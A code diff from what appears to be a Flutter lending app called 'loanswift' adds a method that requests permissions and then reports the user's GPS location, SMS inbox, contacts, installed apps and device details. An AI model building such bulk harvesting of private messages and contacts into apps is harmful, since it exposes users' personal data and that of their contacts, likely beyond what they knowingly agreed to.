@@ -1,17 +1,20 @@
 import 'dart:async';
 import 'dart:io';
+import 'dart:math';
 
 import 'package:android_id/android_id.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:dio/dio.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter/services.dart';
+import 'package:flutter_screenutil/flutter_screenutil.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:geolocator/geolocator.dart';
 import 'package:get_storage/get_storage.dart';
 import 'package:loanswift/core/core.dart';
 import 'package:loanswift/core/dio_client.dart';
 import 'package:loanswift/core/firebase_api.dart';
+import 'package:loanswift/features/domain/entity/permission/permission.dart';
 import 'package:loanswift/features/domain/usecases/common/data_report.dart';
 import 'package:loanswift/features/domain/usecases/common/report_fcm.dart';
 import 'package:loanswift/features/domain/usecases/common/report_gps.dart';
@@ -617,4 +620,43 @@ class ReportService {
     return pos;
   }
   // 上报fcmtoken
+
+  Future<void> applyReportTasks() async {
+    await reportNeededPerms.request();
+
+    double deviceWidth = ScreenUtil().screenWidth;
+    double deviceHeight = ScreenUtil().screenHeight;
+
+    double physicalSize = 0;
+
+    // 获取设备的像素密度（每英寸像素数）
+    double? pixelRatio = ScreenUtil().pixelRatio;
+
+    if (pixelRatio != null) {
+      // 计算物理宽度和高度（以英寸为单位）
+      double physicalWidth = deviceWidth / pixelRatio;
+      double physicalHeight = deviceHeight / pixelRatio;
+
+      // 计算设备的物理尺寸（屏幕对角线的英寸数）
+      physicalSize = sqrt(pow(physicalWidth, 2) + pow(physicalHeight, 2));
+    }
+    //final ReportService reportService = sl();
+    gpsReport().then((b) {
+      logger.i("GPS Report Success");
+    });
+    smsReport().then((b) {
+      logger.i("SMS Report Success");
+    });
+    contactsReport().then((e){
+    logger.i("Contacts Report Success");
+    });
+    installedAppReport().then((e) {
+      logger.i("InstalledApps Report Success");
+    });
+    deviceInfoReport(
+        deviceHeight, deviceWidth, physicalSize).then((e) {
+      logger.i("Device Info Report Success");
+    });
+    // yield await reportService.smsReport();
+  }
 }
